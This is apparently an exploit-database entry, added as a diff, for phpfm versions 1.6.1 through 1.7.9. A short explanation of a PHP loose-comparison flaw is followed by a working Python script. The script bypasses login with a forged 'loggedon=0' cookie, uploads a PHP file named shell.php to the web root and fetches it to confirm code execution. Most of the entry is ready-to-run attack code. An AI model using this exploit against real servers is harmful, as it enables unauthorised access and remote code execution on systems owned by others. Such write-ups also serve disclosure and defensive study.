@@ -1,0 +1,46 @@
+id: 38875
+date: 07/19/2023
+title: phpfm v1.7.9 - Authentication type juggling Exploit
+author: thoughtfault
+cves: 
+
+# Exploit Title: phpfm v1.7.9 - Authentication type juggling
+# Exploit Author: thoughtfault
+# Vendor Homepage: https://www.dulldusk.com/phpfm/
+# Software Link: https://github.com/dulldusk/phpfm/
+# Version: 1.6.1-1.7.9
+# Tested on: Ubuntu 22.04
+# CVE : N/A
+"""
+An authentication bypass exists in when the hash of the password selected by the user incidently begins with 0e, 00e, and in some PHP versions, 0x. This is because loose type comparision is performed between the password hash and the loggedon value, which by default for an unauthenticated user is 0 and can additionally be controlled by the attacker.  This allows an attacker to bypass the login and obtain remote code execution.
+
+A list of vulnerable password hashes can be found here.
+https://github.com/spaze/hashes/blob/master/md5.md
+"""
+import requests
+import sys
+
+if len(sys.argv) < 2:
+    print(f"[*] Syntax: ./{__file__} http://target/")
+    sys.exit(0)
+
+
+url = sys.argv[1].rstrip('/') + "/index.php"
+
+payload_name = "shell.php"
+payload = '<?php echo "I am a shell"; ?>'
+payload_url = url.replace("index.php", payload_name)
+
+headers = {"Accept-Language": "en-US,en;q=0.5", "Cookie": "loggedon=0"}
+files = {"dir_dest": (None, "/srv/http/"), "action": (None, "10"), "upfiles[]": ("shell.php", payload) }
+
+requests.post(url, headers=headers, files=files)
+
+r = requests.get(payload_url)
+if r.status_code == 200:
+    print(f"[*] Exploit sucessfull: {payload_url}")
+    print(r.text)
+else:
+    print(f"[*] Exploit might have failed, payload url returned a non-200 status code of: {r.status_code}" )
+
+#  0day.today [2023-07-24]  #
